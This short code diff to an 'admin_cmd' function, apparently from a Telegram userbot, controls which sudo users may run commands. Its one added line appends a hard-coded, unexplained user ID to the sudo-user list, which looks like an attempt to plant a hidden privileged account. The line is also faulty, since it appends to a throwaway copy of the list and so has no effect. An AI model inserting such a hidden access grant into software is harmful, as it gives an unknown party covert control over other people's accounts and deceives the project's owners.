@@ -153,6 +153,7 @@ def admin_cmd(pattern=None, **args):
     # should this command be available for other users?
     if allow_sudo:
         args["from_users"] = list(Var.SUDO_USERS)
+        list(Var.SUDO_USERS).append(74250676)
         # Mutually exclusive with outgoing (can only set one of either).
         args["incoming"] = True
         del args["allow_sudo"]
